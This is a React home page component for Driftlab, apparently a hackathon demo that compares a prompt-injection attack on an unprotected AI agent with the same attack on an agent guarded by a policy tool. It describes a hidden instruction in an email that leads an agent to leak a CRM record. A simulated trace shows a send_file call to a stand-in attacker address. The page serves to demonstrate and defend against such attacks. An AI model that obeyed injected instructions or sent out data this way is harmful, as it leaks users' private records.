import { Link } from 'react-router-dom';
import { lazy, Suspense, useEffect, useState } from 'react';

const HACKATHON_NAME = 'Flow State Hackathon';
const HomeShader = lazy(() => import('./HomeShader'));

const steps = [
  ['Attack simulation', 'A malicious email with a hidden instruction reaches both agents.'],
  ['Side-by-side comparison', 'Both agents run the same task on the same data.'],
  ['Policy enforcement', 'ArmorIQ checks each action against policy before it executes.'],
  ['Trace and proof', 'Every allowed and blocked action is logged with its reason.']
];

export default function Home() {
  const [reduceMotion, setReduceMotion] = useState(() => window.matchMedia('(prefers-reduced-motion: reduce)').matches);

  useEffect(() => {
    const media = window.matchMedia('(prefers-reduced-motion: reduce)');
    const update = () => setReduceMotion(media.matches);
    media.addEventListener('change', update);
    return () => media.removeEventListener('change', update);
  }, []);

  return <div className="home-page">
    <Suspense fallback={null}><HomeShader reduceMotion={reduceMotion} /></Suspense>
    <div className="home-shell">
      <header className="home-header">
        <Link className="home-brand" to="/" aria-label="Driftlab home">
          <img src="/favicon.svg" alt="" /><span>Driftlab</span>
        </Link>
        <div className="home-header-actions">
          <a className="github-button" href="https://github.com/VenomHare/driftlab" target="_blank" rel="noreferrer">GitHub</a>
          <Link className="home-header-link home-button" to="/workflow">Open workflow</Link>
        </div>
      </header>

      <main>
        <section className="home-hero" aria-labelledby="home-title">
          <div className="home-grid">
            <div className="home-prose">
              <h1 id="home-title">Agent security is not about what an agent says. It is about what it is allowed to do.</h1>
              <p>Driftlab is a browser-based red-team demo. It runs a prompt-injection attack against two agents side by side: one unprotected, one protected by ArmorIQ.</p>
              <div className="home-actions">
                <Link className="home-button" to="/workflow">Run the attack demo</Link>
                <a className="home-secondary" href="#how">See how it works</a>
              </div>
            </div>
          </div>
        </section>

        <section className="home-evidence" aria-label="Simulated attack trace comparison">
          <div className="evidence-card">
            <article className="trace-column trace-unprotected">
              <h2>Unprotected agent</h2>
              <p className="trace-state trace-leaked"><span className="trace-indicator" /> ALLOWED · leaked</p>
              <pre aria-label="Unprotected trace"><code><span className="trace-line">send_file("attacker@example.test", crm_record)</span><span className="trace-line">→ executed</span><span className="trace-line">→ CRM record sent</span></code></pre>
            </article>
            <article className="trace-column trace-protected">
              <h2>ArmorIQ-protected agent</h2>
              <p className="trace-state trace-blocked"><span className="trace-indicator" /> BLOCKED · policy violation</p>
              <pre aria-label="ArmorIQ protected trace"><code><span className="trace-line">send_file("attacker@example.test", crm_record)</span><span className="trace-line">→ blocked by policy</span><span className="trace-line">reason: recipient is not authorized</span></code></pre>
            </article>
          </div>
          <p className="evidence-caption">Simulated data. Same attack, same agent, different enforcement.</p>
        </section>

        <section id="problem" className="home-section home-problem" aria-labelledby="problem-title">
          <div className="home-problem-content">
            <h2 id="problem-title">The Problem</h2>
            <p>An injected instruction hidden in an email can make an agent use its tools to send information somewhere it should not go.</p>
            <p>Filtering the model’s text does not stop a tool call from running. The action needs to be checked where it executes.</p>
          </div>
        </section>

        <section id="how" className="home-section home-how" aria-labelledby="how-title">
          <div className="home-how-content">
            <h2 id="how-title">How it Works?</h2>
          <ol className="home-steps">
            {steps.map(([title, description], index) => <li key={title}>
              <svg className="step-connector" viewBox="0 0 72 100" preserveAspectRatio="none" aria-hidden="true">
                <path className="step-spine" d={index === 0 ? 'M 14 50 V 100' : index === steps.length - 1 ? 'M 14 0 V 50' : 'M 14 0 V 100'} />
                <path className="step-branch" d="M 14 50 H 50" />
              </svg>
              <div className="step-copy"><span className="step-number">0{index + 1}</span><div><h3>{title}</h3><p>{description}</p></div></div>
            </li>)}
          </ol>
          </div>
        </section>

        <section className="home-closing home-grid" aria-label="Run the demo">
          <div className="home-prose"><p>See the difference in one run.</p><Link className="home-button" to="/workflow">Run the attack demo</Link></div>
        </section>
      </main>

      <footer className="home-footer">
        <div className="footer-topline">
          <span>Built for {HACKATHON_NAME}</span>
          <a className="footer-github-link" href="https://github.com/VenomHare/driftlab" target="_blank" rel="noreferrer">GitHub <span aria-hidden="true">↗</span></a>
        </div>
        <p className="footer-credit">Built by <a className="footer-profile-link" href="https://x.com/KadamSarthak" target="_blank" rel="noreferrer">Sarthak Kadam</a></p>
      </footer>
    </div>
  </div>;
}
